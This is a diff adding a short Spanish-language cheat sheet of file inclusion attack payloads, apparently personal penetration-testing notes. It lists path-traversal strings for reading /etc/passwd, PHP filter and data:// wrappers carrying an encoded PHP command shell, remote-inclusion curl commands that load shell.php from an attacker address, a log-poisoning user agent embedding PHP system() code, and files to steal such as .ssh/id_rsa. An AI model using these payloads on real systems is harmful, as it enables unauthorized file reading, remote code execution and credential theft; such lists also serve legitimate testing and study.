@@ -1,0 +1,56 @@
+	#### File inlcusion resume
+Payloads de File_inclusion.txt sion definiciones. Mas info en ese txt
+
+## Basic Payload
+../../../etc/passwd - C:\Windows\boot.ini
+/../../../etc/passwd
+....//....//....//etc/passwd
+..././..././..././etc/passwd
+...\/....\/....\/etc/passwd
+....////....////....////etc/passwd
+%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
+
+## Filter y wrapper
+php://filter/read=convert.base64-encode/resource=config
+data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id
+
+## RFI
+http://10.10.14.155/shell.php&cmd=id
+curl -s "http://10.10.14.155/shell.php&cmd=id"
+curl -s "ftp://10.10.14.155/shell.php&cmd=id"
+
+## Log poisioning
+Linux: /var/lib/php/sessions/sess_<cookie>
+Windows: C:\Windows\Temp\sess_<cookie>
+
+## Server log
+#Apache
+Linux: /var/log/apache2/access.log
+Windows: C:\xampp\apache\logs\access.log
+
+#Nginx
+Linux: /var/log/nginx/access.log
+Windows: C:\nginx\log\access.log
+
+#Useer agent modificado
+Mozilla/5.0 <?php system($_GET['cmd']); ?> Safari/537.36
+
+## Otros logs
+/var/log/sshd.log
+/var/log/mail
+/var/log/vsftpd.log
+
+## Archivos que contiene path a log
+/etc/apache2/apache2.conf
+/etc/apachee2/envvars
+
+## Listas fuzzing
+Windows: https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows
+Linux: https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux
+
+## Otros archivos a consultar
+.ssh/id_rsa
+/proc/net/tcp
+/proc/net/tcp/fib_trie
+/proc/<dir numero>/cmdline
+/etc/apache2/sites-enabled/000-default.conf
